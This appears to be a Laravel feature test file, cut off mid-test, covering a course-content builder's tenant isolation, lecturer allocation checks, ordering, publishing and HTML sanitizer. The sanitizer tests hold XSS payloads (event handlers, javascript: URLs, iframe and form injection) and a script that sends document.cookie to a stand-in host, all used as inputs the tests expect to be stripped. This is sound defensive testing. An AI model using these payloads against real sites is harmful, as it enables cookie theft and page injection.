<?php

namespace Tests\Feature;

use App\Models\CourseOfferingLesson;
use App\Models\CourseOfferingModule;
use App\Models\CourseOfferingLessonProgress;
use App\Support\CourseContent\HtmlSanitizer;
use Illuminate\Support\Carbon;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Storage;
use Illuminate\Http\UploadedFile;
use Tests\Feature\Support\AssignmentFixture;
use Tests\TestCase;

/**
 * Course Content: the lecturer authoring surface.
 *
 * Covers the things that must be true BEFORE a student ever sees a word:
 * authority, tenant and Offering isolation, the sanitizer, the publish rules,
 * ordering, and the platform-safety properties (no offline claims, no autoplay,
 * no giant assets).
 *
 * The student reader has its own suite, CourseContentReaderTest, because the
 * two answer different questions and a failure in one should not be counted
 * against the other.
 */
class CourseContentTest extends TestCase
{
    // Brings CourseContentFixture with it, plus the assignment tables. The
    // student reader now lists module assessments and computes module completion
    // from them, so rendering the page genuinely reads those tables - and a
    // fixture that does not build them would be testing a page that cannot work.
    use AssignmentFixture;

    // ══════════════════════════════════════════════════════════════════════
    // TENANT ISOLATION
    // ══════════════════════════════════════════════════════════════════════

    public function test_a_lecturer_cannot_open_another_tenants_content_builder(): void
    {
        $other = $this->otherTenant();

        $this->actingAs($this->lecturer)
            ->get("/teacher/course-offerings/{$other['offeringId']}/content")
            ->assertNotFound();
    }

    public function test_a_lecturer_cannot_create_a_module_in_another_tenants_offering(): void
    {
        $other = $this->otherTenant();

        $this->actingAs($this->lecturer)
            ->post("/teacher/course-offerings/{$other['offeringId']}/content/modules", [
                'title' => 'Injected module',
            ])
            ->assertNotFound();

        $this->assertSame(0, DB::table('course_offering_modules')
            ->where('title', 'Injected module')->count());
    }

    public function test_a_lecturer_cannot_move_a_lesson_into_another_tenants_module(): void
    {
        $other = $this->otherTenant();
        $lesson = $this->lesson();

        // A PUT to OUR OWN Offering, carrying a module id that belongs to
        // another institution. The Offering id is the trap: it is genuinely
        // ours, so only the parent re-resolution can catch this.
        $this->actingAs($this->lecturer)
            ->put("/teacher/course-offerings/{$this->offering->id}/content/lessons/{$lesson->id}", [
                'title' => $lesson->title,
                'status' => 'draft',
                'course_offering_module_id' => $other['moduleId'],
            ])
            ->assertNotFound();

        $this->assertSame(
            (int) $lesson->course_offering_module_id,
            (int) CourseOfferingLesson::query()->find($lesson->id)->course_offering_module_id
        );
        $this->assertNotSame(
            (int) $other['moduleId'],
            (int) CourseOfferingLesson::query()->find($lesson->id)->course_offering_module_id
        );
    }

    public function test_a_lecturer_cannot_edit_a_lesson_that_belongs_to_another_tenant(): void
    {
        $other = $this->otherTenant();

        $this->actingAs($this->lecturer)
            ->put("/teacher/course-offerings/{$this->offering->id}/content/lessons/{$other['lessonId']}", [
                'title' => 'Hijacked',
                'status' => 'published',
            ])
            ->assertNotFound();

        $this->assertSame('Other tenant lesson', DB::table('course_offering_lessons')
            ->where('id', $other['lessonId'])->value('title'));
    }

    public function test_a_lecturer_cannot_reorder_another_tenants_modules(): void
    {
        $other = $this->otherTenant();

        $this->actingAs($this->lecturer)
            ->post("/teacher/course-offerings/{$this->offering->id}/content/modules/order", [
                'order' => [$other['moduleId']],
            ]);

        // The foreign id is discarded, not honoured. Our own module keeps its
        // position rather than being pulled into a list it was never in.
        $this->assertSame(1, (int) DB::table('course_offering_modules')
            ->where('id', $other['moduleId'])->value('sequence'));
    }

    // ══════════════════════════════════════════════════════════════════════
    // LECTURER AUTHORITY
    // ══════════════════════════════════════════════════════════════════════

    public function test_an_unallocated_lecturer_cannot_author_content(): void
    {
        // Grace is a lecturer in the same school with a real user, but holds NO
        // allocation on this Offering. The allocation - not the role - is the
        // gate.
        DB::table('course_offering_lecturer_allocations')
            ->where('user_id', $this->otherLecturer->id)
            ->delete();

        $this->actingAs($this->otherLecturer)
            ->post("/teacher/course-offerings/{$this->offering->id}/content/modules", [
                'title' => 'Should not exist',
            ])
            // 404, not 403: the lecturer workspace already answers an
            // unallocated lecturer this way, and "does not exist" and "not
            // yours" being the same response is what stops a guessed id from
            // revealing what other lecturers are teaching.
            ->assertNotFound();

        $this->assertSame(0, DB::table('course_offering_modules')
            ->where('title', 'Should not exist')->count());
    }

    public function test_the_source_field_is_hidden_but_still_carries_the_content(): void
    {
        // THE REGRESSION THIS PINS.
        //
        // Summernote does not hide the textarea it is initialised on, so a
        // lecturer was shown a raw HTML box above the editor - two authoring
        // surfaces, with the plainer one more prominent. Hiding it must not cost
        // anything the rest of the page depends on: the field is still named, so
        // it is still submitted, still holds the editor's markup, and still
        // reaches the sanitizer. A fix that deleted the textarea, or renamed it,
        // would pass a "is it hidden" check and silently lose every lesson body.
        $this->module();
        $editor = $this->actingAs($this->lecturer)
            ->get("/teacher/course-offerings/{$this->offering->id}/content/lessons/create");
        $editor->assertOk();
        $html = $editor->getContent();

        // Hidden: a CSS rule that takes the source field out of the page.
        $this->assertStringContainsString('textarea#cc-body', $html, 'the source field is not hidden by any rule');
        $this->assertMatchesRegularExpression(
            '/\.cc-editor-shell[^}]*textarea#cc-body[^}]*\{[^}]*display:\s*none/i',
            $html,
            'the source field has no display:none rule'
        );

        // Still present and still named, so it is still posted and still holds
        // the value Summernote synchronises into it.
        $this->assertStringContainsString('id="cc-body"', $html);
        $this->assertStringContainsString('name="body"', $html, 'the hidden field must keep its form name');

        // The editor remains the authoring surface, and carries the label's
        // accessible name now that the label's own control is hidden.
        $this->assertStringContainsString('id="cc-body-label"', $html);
        $this->assertStringContainsString("aria-labelledby', 'cc-body-label'", $html);

        // And the hidden field really does carry the content through a save:
        // submitted, sanitised on the way in, and stored.
        $response = $this->actingAs($this->lecturer)
            ->post("/teacher/course-offerings/{$this->offering->id}/content/lessons", [
                'title' => 'Carried by the hidden field',
                'status' => 'published',
                'course_offering_module_id' => CourseOfferingModule::query()->firstOrFail()->id,
                'body' => '<p>Real lesson text</p><script>alert(1)</script>',
            ]);
        $response->assertRedirect();

        $lesson = CourseOfferingLesson::query()
            ->where('title', 'Carried by the hidden field')->firstOrFail();

        $this->assertStringContainsString('Real lesson text', $lesson->body);
        $this->assertStringNotContainsString('<script', $lesson->body);
    }

    public function test_a_lesson_with_an_attachment_loads_in_the_editor(): void
    {
        // THE REGRESSION THIS PINS - a real production 500.
        //
        // The editor resolves the attachment route INSIDE the loop over the
        // lesson's resources. So a lesson with no attachment never reaches that
        // line and renders perfectly, while a lesson with one resolves a route
        // name that was never registered and throws - surfacing as the generic
        // "Something went wrong" page.
        //
        // That is why it went unnoticed: Lesson #2 (no attachment) opened fine
        // and Lesson #1 (one attachment) 500'd, on data that was entirely valid.
        // Both halves matter, so this pins the page AND the download.
        Storage::fake('local');

        $module = $this->module();
        $lesson = $this->lesson($module, ['status' => 'draft']);

        // The real shape of the record that failed: a stored file under a
        // generated name, kept outside the web root.
        $resource = $this->resource($lesson, [
            'type' => 'file',
            'link_url' => null,
            'title' => 'admin-piie (2) (1)',
            'original_name' => 'admin-piie (2) (1).pdf',
            'stored_name' => 'course-content/5/db5e1e863dd7b010a2a4a15a105b1fad.pdf',
            'mime_type' => 'application/pdf',
            'size_bytes' => 692652,
        ]);
        Storage::disk('local')->put($resource->stored_name, 'pdf bytes');

        $response = $this->actingAs($this->lecturer)
            ->get("/teacher/course-offerings/{$this->offering->id}/content/lessons/{$lesson->id}/edit");

        // A 500 here is the exact production failure.
        $response->assertOk();

        // The attachment is offered through the authorised route rather than as
        // a raw stored path.
        $response->assertSee(
            route('teacher.course_offerings.content.resources.file', $resource->id),
            false
        );
        $response->assertSee('admin-piie (2) (1).pdf');

        // And that route resolves and serves the file, behind the same lecturer
        // middleware as the rest of the workspace.
        $this->actingAs($this->lecturer)
            ->get(route('teacher.course_offerings.content.resources.file', $resource->id))
            ->assertOk();
    }

    public function test_a_lesson_without_an_attachment_still_loads(): void
    {
        // The other half of the same regression: the no-attachment case worked
        // throughout and must keep working.
        $this->module();
        $lesson = $this->lesson();

        $this->actingAs($this->lecturer)
            ->get("/teacher/course-offerings/{$this->offering->id}/content/lessons/{$lesson->id}/edit")
            ->assertOk();
    }

    public function test_every_route_named_by_a_course_content_template_is_registered(): void
    {
        // THE GENERIC GUARD FOR THIS WHOLE CLASS OF DEFECT.
        //
        // A view resolving an unregistered route name throws at RENDER time, and
        // only for the data shape that reaches that line - here, only for a
        // lesson that has an attachment. That is the worst kind of failure to
        // chase: the page looks healthy until one real record exercises the
        // branch.
        //
        // The cause was a route declared with a FULL path and a FULL name inside
        // a group that already prefixes both, so it silently registered under a
        // DOUBLED name while every template asked for the undoubled one. Nothing
        // else noticed: `route:list` truncates long columns, and the existing
        // route-integrity test only checks that an action resolves to a real
        // method - neither looks at the name a view will ask for.
        //
        // So check the names the templates actually reference. That covers this
        // instance and every future one, without asserting anything about how the
        // routes happen to be written.
        $templates = [
            'teacher/course_offerings/content/index',
            'teacher/course_offerings/content/lesson_form',
            'teacher/course_offerings/content/lesson_preview',
            'student/course_content/index',
            'student/course_content/lesson',
        ];

        $referenced = [];
        foreach ($templates as $template) {
            $source = (string) file_get_contents(
                resource_path('views/'.str_replace('.', '/', $template).'.blade.php')
            );

            preg_match_all("/route\(\s*'([a-z0-9_.]+)'/", $source, $matches);

            foreach ($matches[1] as $name) {
                $referenced[$name] = $template;
            }
        }

        $this->assertNotEmpty($referenced, 'no route() calls were found, so this scan proves nothing');

        foreach ($referenced as $name => $template) {
            $this->assertTrue(
                app('router')->has($name),
                $template." calls route('".$name."'), which is not registered. A route declared with a"
                .' full path and full name inside a group that already prefixes both registers'
                .' DOUBLED - use a relative path and a leaf name.'
            );
        }
    }
    public function test_a_lecturer_with_an_allocation_that_is_not_yet_in_force_cannot_author(): void
    {
        // THE REGRESSION THIS PINS.
        //
        // `course_content.manage` is granted to every teaching role by the
        // role-based compatibility layer, so it cannot be used to tell an
        // administrator from a lecturer. If the lecturer and administrator
        // authority checks were unioned, a lecturer who failed the ALLOCATION
        // check would fall through to the admin path and be let in by their role
        // alone - which defeats the allocation gate while still passing every
        // "can an allocated lecturer author?" test, because those users DO hold
        // an allocation.
        //
        // So the case is a lecturer whose allocation exists but does not start
        // until next year: reachable, resolvable, and still not permitted.
        DB::table('course_offering_lecturer_allocations')
            ->where('user_id', $this->otherLecturer->id)
            ->update(['starts_on' => now()->addYear()->toDateString()]);

        $this->actingAs($this->otherLecturer)
            ->post("/teacher/course-offerings/{$this->offering->id}/content/modules", [
                'title' => 'Not yet in force',
            ])
            ->assertForbidden();

        $this->assertSame(0, DB::table('course_offering_modules')
            ->where('title', 'Not yet in force')->count());
    }

    public function test_an_unallocated_lecturer_cannot_edit_an_existing_lesson(): void
    {
        $lesson = $this->lesson();

        DB::table('course_offering_lecturer_allocations')
            ->where('user_id', $this->otherLecturer->id)->delete();

        $this->actingAs($this->otherLecturer)
            ->put("/teacher/course-offerings/{$this->offering->id}/content/lessons/{$lesson->id}", [
                'title' => 'Not mine to change',
                'status' => 'published',
            ])
            ->assertNotFound();

        $this->assertSame($lesson->title, CourseOfferingLesson::query()->find($lesson->id)->title);
    }

    public function test_a_lecturer_whose_allocation_is_not_in_force_cannot_reach_the_admin_path(): void
    {
        // The same regression from the OTHER side: the PRIMARY lecturer, whose
        // allocation the rest of the suite relies on, is made not-yet-in-force
        // so this cannot pass merely because the fixture user happens to be
        // allocated.
        DB::table('course_offering_lecturer_allocations')
            ->where('user_id', $this->lecturer->id)
            ->update(['starts_on' => now()->addYear()->toDateString()]);

        $this->actingAs($this->lecturer)
            ->post("/teacher/course-offerings/{$this->offering->id}/content/modules", [
                'title' => 'Written before my allocation starts',
            ])
            ->assertForbidden();

        $this->assertSame(0, DB::table('course_offering_modules')
            ->where('title', 'Written before my allocation starts')->count());
    }

    public function test_a_lecturer_whose_allocation_has_ended_cannot_author(): void
    {
        DB::table('course_offering_lecturer_allocations')
            ->where('user_id', $this->lecturer->id)
            ->update(['ends_on' => now()->subDay()->toDateString()]);

        $this->actingAs($this->lecturer)
            ->post("/teacher/course-offerings/{$this->offering->id}/content/modules", [
                'title' => 'Written after my allocation ended',
            ])
            ->assertForbidden();

        $this->assertSame(0, DB::table('course_offering_modules')
            ->where('title', 'Written after my allocation ended')->count());
    }

    public function test_a_teacher_is_never_treated_as_a_course_offering_administrator(): void
    {
        // `course_content.manage` is granted to every teaching role by the
        // role-based compatibility layer, so it must NOT be accepted as proof of
        // administration. If it were, this predicate would answer "true" for an
        // ordinary lecturer, and it is one careless caller away from granting a
        // teacher admin rights over any Offering in the school.
        $access = app(\App\Support\CourseContent\CourseContentAccess::class);

        $this->assertTrue(
            $access->canLecturerManage($this->lecturer, $this->offering),
            'an allocated lecturer should be able to author'
        );
        $this->assertFalse(
            $access->canAdminManage($this->lecturer, $this->offering),
            'a lecturer must not satisfy the administrator check'
        );
    }

    public function test_the_allocation_check_does_not_depend_on_how_the_caller_found_the_offering(): void
    {
        // `teachingActionsAllowed()` reads a `my_allocation_id` attribute that
        // only the lecturer resolver attaches, so a caller holding a plainly
        // loaded Offering used to be denied a permission they genuinely hold -
        // safe, but baffling and easy to reintroduce.
        $access = app(\App\Support\CourseContent\CourseContentAccess::class);

        $plain = \App\Models\CourseOffering::query()->findOrFail($this->offering->id);

        $this->assertNull($plain->getAttribute('my_allocation_id'), 'this Offering was loaded without the resolver');
        $this->assertTrue(
            $access->canLecturerManage($this->lecturer, $plain),
            'the answer must depend on who the actor is, not on how the row was loaded'
        );
    }

    public function test_a_co_lecturer_on_the_allocation_can_edit_content(): void
    {
        // The complement of the test above, and the one that would catch an
        // over-tightened rule: any allocation on the Offering is enough. The
        // gate is "is this person allocated", not "are they the primary
        // lecturer" - a second lecturer teaching the same unit is ordinary.
        $lesson = $this->lesson();

        $this->actingAs($this->otherLecturer)
            ->put("/teacher/course-offerings/{$this->offering->id}/content/lessons/{$lesson->id}", [
                'title' => 'Revised by the co-lecturer',
                'status' => 'published',
            ])
            ->assertRedirect();

        $this->assertSame('Revised by the co-lecturer',
            CourseOfferingLesson::query()->find($lesson->id)->title);
    }

    public function test_a_lecturer_cannot_author_content_for_an_offering_in_another_school_they_can_see(): void
    {
        // Even given a perfectly valid id, the tenant check on the Offering
        // itself is what refuses. This is the boundary a URL edit tests.
        $other = $this->otherTenant();

        $this->actingAs($this->otherLecturer)
            ->post("/teacher/course-offerings/{$other['offeringId']}/content/modules", [
                'title' => 'Wrong school',
            ])
            ->assertNotFound();
    }

    public function test_a_student_cannot_reach_the_lecturer_builder(): void
    {
        // Role separation, not just a hidden link. The teacher middleware
        // redirects a student away rather than rendering a 403 page, so the
        // assertion is that the builder is NOT served - the status and the
        // absence of its content are what matter.
        $response = $this->actingAs($this->student)
            ->get("/teacher/course-offerings/{$this->offering->id}/content");

        $response->assertDontSee('Build and organise the learning journey');
        $this->assertNotContains(200, [$response->getStatusCode()]);
    }

    public function test_an_anonymous_visitor_cannot_reach_the_builder(): void
    {
        $this->get("/teacher/course-offerings/{$this->offering->id}/content")
            ->assertRedirect();
    }

    // ══════════════════════════════════════════════════════════════════════
    // CROSS-OFFERING DENIAL (same tenant, different Offering)
    // ══════════════════════════════════════════════════════════════════════

    public function test_a_lesson_cannot_be_read_through_the_wrong_offering_url(): void
    {
        // Same school, same tenant - only the Offering differs. Without the
        // Offering predicate on the lesson query, this would render a lesson
        // from a different delivery under the first one's URL.
        $other = $this->secondOfferingSameSchool();
        $lesson = $this->lesson();

        $this->actingAs($this->lecturer)
            ->get("/teacher/course-offerings/{$other->id}/content/lessons/{$lesson->id}/edit")
            ->assertNotFound();
    }

    public function test_a_lesson_in_another_offering_cannot_be_edited_through_ours(): void
    {
        $lesson = $this->lesson();

        $this->actingAs($this->lecturer)
            ->put("/teacher/course-offerings/{$this->offering->id}/content/lessons/{$lesson->id}", [
                'title' => 'Edited via the right URL but wrong parent',
                'status' => 'published',
            ])
            ->assertRedirect();

        // Sanity: the edit DID apply here, because the lesson genuinely belongs
        // to this Offering. The point of the neighbouring test is that the
        // mismatch is caught when it does not.
        $this->assertSame('Edited via the right URL but wrong parent',
            CourseOfferingLesson::query()->find($lesson->id)->title);
    }

    // ══════════════════════════════════════════════════════════════════════
    // THE MODULE BUILDER
    // ══════════════════════════════════════════════════════════════════════

    public function test_the_content_page_explains_itself_before_showing_a_list(): void
    {
        $response = $this->actingAs($this->lecturer)
            ->get("/teacher/course-offerings/{$this->offering->id}/content");

        $response->assertOk();
        // "Where am I and what do I do" - the brief's first requirement.
        $response->assertSee('Course Content');
        $response->assertSee('Build and organise the learning journey');
        $response->assertSee('Business Mathematics');
        $response->assertSee('+ Add Module');
        // Plain words, not raw database terminology.
        $response->assertSee('Draft');
        $response->assertDontSee('course_offering_modules');
    }

    public function test_a_lecturer_can_create_a_module_and_it_starts_as_a_draft(): void
    {
        $this->actingAs($this->lecturer)
            ->post("/teacher/course-offerings/{$this->offering->id}/content/modules", [
                'title' => 'Module 1 — Foundations of Business Mathematics',
                'summary' => 'Where the course starts.',
            ])
            ->assertRedirect();

        $module = CourseOfferingModule::query()->firstOrFail();

        $this->assertSame('Module 1 — Foundations of Business Mathematics', $module->title);
        $this->assertSame(CourseOfferingModule::STATUS_DRAFT, $module->status);
        $this->assertSame($this->school, $module->school_id);
        $this->assertSame($this->offering->id, $module->course_offering_id);
        $this->assertSame($this->lecturer->id, $module->created_by);
    }

    public function test_a_module_requires_a_title(): void
    {
        $this->actingAs($this->lecturer)
            ->post("/teacher/course-offerings/{$this->offering->id}/content/modules", ['title' => ''])
            ->assertSessionHasErrors('title');

        $this->assertSame(0, CourseOfferingModule::query()->count());
    }

    public function test_module_sequence_is_assigned_by_the_server_not_the_client(): void
    {
        $this->actingAs($this->lecturer)
            ->post("/teacher/course-offerings/{$this->offering->id}/content/modules", [
                'title' => 'First', 'sequence' => 99,
            ]);

        $this->assertSame(1, (int) CourseOfferingModule::query()->where('title', 'First')->value('sequence'));
    }

    public function test_a_module_can_be_moved_between_published_and_archived(): void
    {
        $module = $this->module();

        $this->actingAs($this->lecturer)
            ->put("/teacher/course-offerings/{$this->offering->id}/content/modules/{$module->id}", [
                'title' => $module->title, 'status' => 'archived',
            ])
            ->assertRedirect();

        $this->assertSame(CourseOfferingModule::STATUS_ARCHIVED, $module->fresh()->status);
    }

    // ══════════════════════════════════════════════════════════════════════
    // ORDERING
    // ══════════════════════════════════════════════════════════════════════

    public function test_modules_can_be_reordered_and_the_server_is_authoritative(): void
    {
        $a = $this->module(['title' => 'A']);
        $b = $this->module(['title' => 'B']);
        $c = $this->module(['title' => 'C']);

        $this->actingAs($this->lecturer)
            ->post("/teacher/course-offerings/{$this->offering->id}/content/modules/order", [
                'order' => [$c->id, $a->id, $b->id],
            ])
            ->assertRedirect();

        $this->assertSame([$c->id, $a->id, $b->id], $this->moduleOrder());
    }

    public function test_a_partial_reorder_does_not_lose_the_modules_that_were_omitted(): void
    {
        $a = $this->module(['title' => 'A']);
        $b = $this->module(['title' => 'B']);
        $c = $this->module(['title' => 'C']);

        // A stale or partial request must not renumber around absent rows. The
        // omitted module keeps a slot rather than being deleted or duplicated.
        $this->actingAs($this->lecturer)
            ->post("/teacher/course-offerings/{$this->offering->id}/content/modules/order", [
                'order' => [$c->id, $a->id],
            ]);

        $order = $this->moduleOrder();
        $this->assertCount(3, $order);
        $this->assertSame([$c->id, $a->id], [$order[0], $order[1]]);
        $this->assertContains($b->id, $order);
    }

    public function test_lessons_can_be_reordered_within_their_module(): void
    {
        $module = $this->module();
        $one = $this->lesson($module, ['title' => 'One']);
        $two = $this->lesson($module, ['title' => 'Two']);
        $three = $this->lesson($module, ['title' => 'Three']);

        $this->actingAs($this->lecturer)
            ->post("/teacher/course-offerings/{$this->offering->id}/content/modules/{$module->id}/lessons/order", [
                'order' => [$three->id, $one->id, $two->id],
            ])->assertRedirect();

        $actual = CourseOfferingLesson::query()->where('course_offering_module_id', $module->id)
            ->orderBy('sequence')->pluck('id')->map(fn ($id) => (int) $id)->all();

        $this->assertSame([$three->id, $one->id, $two->id], $actual);
    }

    public function test_reordering_cannot_move_a_lesson_between_modules(): void
    {
        $first = $this->module(['title' => 'First']);
        $second = $this->module(['title' => 'Second']);
        $inside = $this->lesson($first, ['title' => 'Inside first']);

        $this->actingAs($this->lecturer)
            ->post("/teacher/course-offerings/{$this->offering->id}/content/modules/{$second->id}/lessons/order", [
                'order' => [$inside->id],
            ]);

        // The id is not in the second module's owned set, so it is discarded and
        // the lesson stays exactly where it was.
        $this->assertSame($first->id, (int) $inside->fresh()->course_offering_module_id);
    }

    // ══════════════════════════════════════════════════════════════════════
    // RTE SECURITY
    // ══════════════════════════════════════════════════════════════════════

    #[\PHPUnit\Framework\Attributes\DataProvider('dangerousPayloads')]
    public function test_the_sanitizer_removes_every_dangerous_construct(string $label, string $payload, array $mustNotContain): void
    {
        $sanitizer = app(HtmlSanitizer::class);
        $clean = $sanitizer->sanitize($payload);

        foreach ($mustNotContain as $needle) {
            $this->assertStringNotContainsStringIgnoringCase($needle, $clean, "{$label}: '{$needle}' survived sanitising");
        }
    }

    public static function dangerousPayloads(): array
    {
        return [
            'script element' => ['script', '<p>Hi</p><script>alert(1)</script>', ['<script', 'alert(1)']],
            'inline event handler' => ['onerror', '<img src="https://x.test/a.png" onerror="alert(1)">', ['onerror', 'alert(1)']],
            'javascript url' => ['href', '<a href="javascript:alert(1)">click</a>', ['javascript:', 'href']],
            'data uri image' => ['data uri', '<img src="data:text/html;base64,PHNjcmlwdD4=">', ['data:text', '<img']],
            'style element' => ['style', '<style>body{display:none}</style><p>ok</p>', ['<style', 'display:none']],
            'iframe' => ['iframe', '<iframe src="https://evil.test"></iframe>', ['<iframe', 'evil.test']],
            'svg onload' => ['svg', '<svg onload="alert(1)"></svg>', ['<svg', 'onload']],
            'form injection' => ['form', '<form action="https://evil.test"><input name="a"></form>', ['<form', '<input', 'evil.test']],
            'protocol relative url' => ['//', '<a href="//evil.test/x">click</a>', ['evil.test']],
            'relative url' => ['relative', '<a href="/admin/secret">click</a>', ['/admin/secret']],
            'obfuscated scheme' => ['control chars', "<a href=\"java\x00script:alert(1)\">x</a>", ['javascript', 'java']],
            'object element' => ['object', '<object data="https://evil.test"></object>', ['<object', 'evil.test']],
            'embed element' => ['embed', '<embed src="https://evil.test/x.swf">', ['<embed', 'evil.test']],
            'form event handler' => ['onfocus', '<input autofocus onfocus="alert(1)">', ['onfocus', '<input']],
            'meta refresh' => ['meta', '<meta http-equiv="refresh" content="0;url=https://evil.test">', ['<meta', 'evil.test']],
            'base tag' => ['base', '<base href="https://evil.test/">', ['<base', 'evil.test']],
            'style attribute' => ['style attr', '<p style="position:fixed;top:0">x</p>', ['position:fixed', 'style=']],
            'body onload' => ['body', '<body onload="alert(1)">x</body>', ['onload', '<body']],
            'comment hiding markup' => ['comment', '<!--[if IE]><script>alert(1)</script><![endif]-->', ['<script', 'alert(1)']],
        ];
    }

    public function test_the_sanitizer_preserves_the_formatting_a_lecturer_actually_needs(): void
    {
        $sanitizer = app(HtmlSanitizer::class);

        $rich = '<h2>Heading</h2><p><strong>bold</strong> <em>italic</em> <u>underline</u></p>'
            .'<ul><li>one</li></ul><ol><li>two</li></ol>'
            .'<blockquote><p>a quotation</p></blockquote>'
            .'<table><thead><tr><th scope="col">A</th></tr></thead><tbody><tr><td colspan="2">1</td></tr></tbody></table>'
            .'<p>H<sub>2</sub>O and E=mc<sup>2</sup></p>'
            .'<p style="x"><a href="https://example.org/a" target="_blank">link</a></p>'
            .'<img src="https://example.org/a.png" alt="Diagram">';

        $clean = $sanitizer->sanitize($rich);

        foreach ([
            '<h2>Heading</h2>', '<strong>bold</strong>', '<em>italic</em>', '<u>underline</u>',
            '<ul>', '<ol>', '<blockquote>', '<table>', '<thead>', '<th scope="col">A</th>',
            'colspan="2"', '<sub>2</sub>', '<sup>2</sup>', 'href="https://example.org/a"',
            'src="https://example.org/a.png"', 'alt="Diagram"',
        ] as $needle) {
            $this->assertStringContainsString($needle, $clean, "legitimate markup was lost: {$needle}");
        }
    }

    public function test_a_link_opened_in_a_new_tab_loses_its_window_opener_reference(): void
    {
        $clean = app(HtmlSanitizer::class)
            ->sanitize('<a href="https://example.org" target="_blank">x</a>');

        $this->assertStringContainsString('noopener', $clean);
    }

    public function test_images_are_lazy_by_default_for_low_bandwidth_readers(): void
    {
        $clean = app(HtmlSanitizer::class)->sanitize('<img src="https://example.org/a.png">');

        $this->assertStringContainsString('loading="lazy"', $clean);
    }

    public function test_a_blocked_image_is_removed_entirely_rather_than_left_broken(): void
    {
        $clean = app(HtmlSanitizer::class)->sanitize('<p>before</p><img src="javascript:alert(1)"><p>after</p>');

        $this->assertStringNotContainsString('<img', $clean);
        $this->assertStringContainsString('before', $clean);
        $this->assertStringContainsString('after', $clean);
    }

    public function test_disallowed_markup_is_unwrapped_so_the_lecturers_words_survive(): void
    {
        $clean = app(HtmlSanitizer::class)->sanitize('<marquee>important words</marquee>');

        $this->assertStringContainsString('important words', $clean);
        $this->assertStringNotContainsString('marquee', $clean);
    }

    public function test_equation_notation_is_reserved_and_preserved_but_not_executed(): void
    {
        $clean = app(HtmlSanitizer::class)
            ->sanitize('<p><span class="cc-equation" data-latex="x^2+y^2=z^2">x2+y2=z2</span></p>');

        $this->assertStringContainsString('data-latex="x^2+y^2=z^2"', $clean);
        $this->assertStringNotContainsString('<script', $clean);
    }

    public function test_a_script_tag_submitted_through_the_lesson_form_is_not_stored(): void
    {
        $module = $this->module();

        $this->actingAs($this->lecturer)
            ->post("/teacher/course-offerings/{$this->offering->id}/content/lessons", [
                'title' => 'Hostile lesson',
                'status' => 'published',
                'course_offering_module_id' => $module->id,
                'body' => '<p>Real content</p><script>fetch("//evil.test?c="+document.cookie)</script>',
            ])
            ->assertRedirect();

        $stored = CourseOfferingLesson::query()->where('title', 'Hostile lesson')->firstOrFail();

        $this->assertStringNotContainsString('<script', $stored->body);
        $this->assertStringNotContainsString('document.cookie', $stored->body);
        $this->assertStringContainsString('Real content', $stored->body);
    }

    public function test_the_body_is_sanitised_on_the_model_so_no_write_path_can_skip_it(): void
    {
        // A direct model write - a seeder, a console command, a future service -
        // must be filtered too. A mutator, not a controller call that has to be
        // remembered.
        $lesson = $this->lesson(null, ['body' => '<p>ok</p><script>alert(1)</script>']);

        $this->assertStringNotContainsString('<script', $lesson->body);
        $this->assertStringContainsString('<p>ok</p>', $lesson->body);
    }

    public function test_a_preview_does_not_become_a_way_to_render_unsanitised_html(): void
    {
        $module = $this->module();
        $lesson = $this->lesson($module, ['body' => '<p>clean</p>']);

        $response = $this->actingAs($this->lecturer)
            ->post("/teacher/course-offerings/{$this->offering->id}/content/lessons/{$lesson->id}/preview", [
                'preview_draft' => 1,
                'title' => 'Preview attack',
                'body' => '<p>safe</p><script>alert(1)</script>',
            ]);

        $response->assertOk();
        $response->assertDontSee('<script>alert(1)', false);
    }

    // ══════════════════════════════════════════════════════════════════════
    // PUBLISHING WORKFLOW
    // ══════════════════════════════════════════════════════════════════════

    public function test_a_lecturer_can_create_a_lesson_as_a_draft(): void
    {
        $module = $this->module();

        $this->actingAs($this->lecturer)
            ->post("/teacher/course-offerings/{$this->offering->id}/content/lessons", [
                'title' => 'Introduction to Business Mathematics',
                'course_offering_module_id' => $module->id,
                'status' => 'draft',
                'body' => '<p>Welcome.</p>',
            ])
            ->assertRedirect();

        $lesson = CourseOfferingLesson::query()->where('title', 'Introduction to Business Mathematics')->firstOrFail();

        $this->assertSame(CourseOfferingLesson::STATUS_DRAFT, $lesson->status);
        $this->assertFalse($lesson->isReleasedToStudents());
    }

    public function test_a_lecturer_can_publish_a_lesson_with_content(): void
    {
        $module = $this->module();
        $lesson = $this->lesson($module, ['status' => 'draft']);

        $this->actingAs($this->lecturer)
            ->put("/teacher/course-offerings/{$this->offering->id}/content/lessons/{$lesson->id}", [
                'title' => $lesson->title,
                'status' => 'published',
                'body' => '<p>Percentages explained.</p>',
            ])
            ->assertRedirect();

        $this->assertSame(CourseOfferingLesson::STATUS_PUBLISHED, $lesson->fresh()->status);
        $this->assertTrue($lesson->fresh()->isReleasedToStudents());
    }

    public function test_an_empty_lesson_cannot_be_published(): void
    {
        $module = $this->module();
        $lesson = $this->lesson($module, ['status' => 'draft', 'body' => null]);

        $this->actingAs($this->lecturer)
            ->put("/teacher/course-offerings/{$this->offering->id}/content/lessons/{$lesson->id}", [
                'title' => $lesson->title,
                'status' => 'published',
                'body' => '<p>   </p>',
            ])->assertSessionHasErrors();

        $this->assertSame(CourseOfferingLesson::STATUS_DRAFT, $lesson->fresh()->status);
    }

    public function test_a_lesson_with_a_future_release_is_scheduled_not_live(): void
    {
        $module = $this->module();
        $lesson = $this->lesson($module, [
            'status' => 'published',
            'released_at' => now()->addWeek(),
        ]);

        // The lecturer must not be told their content is live when it is not.
        $this->assertFalse($lesson->isReleasedToStudents());
    }

    public function test_a_scheduled_lesson_is_shown_as_scheduled_on_the_builder(): void
    {
        $module = $this->module();
        $this->lesson($module, [
            'title' => 'Next week lesson',
            'status' => 'published',
            'released_at' => now()->addWeek(),
        ]);

        $response = $this->actingAs($this->lecturer)
            ->get("/teacher/course-offerings/{$this->offering->id}/content");

        $response->assertOk();
        $response->assertSee('Scheduled');
    }

    public function test_a_draft_module_is_labelled_draft_in_plain_words(): void
    {
        $module = $this->module(['status' => 'draft']);

        $this->assertSame('Draft', $module->displayStatusLabel());
    }

    public function test_a_published_module_with_a_past_release_reads_as_published(): void
    {
        $module = $this->module(['status' => 'published', 'released_at' => now()->subDay()]);

        $this->assertSame('Published', $module->displayStatusLabel());
    }

    public function test_a_lesson_belongs_to_exactly_one_offering_and_the_model_enforces_it(): void
    {
        $ours = $this->module(['title' => 'Ours']);

        // A second module under a genuinely DIFFERENT Offering in the same
        // school. Two modules of one Offering would not test the invariant at
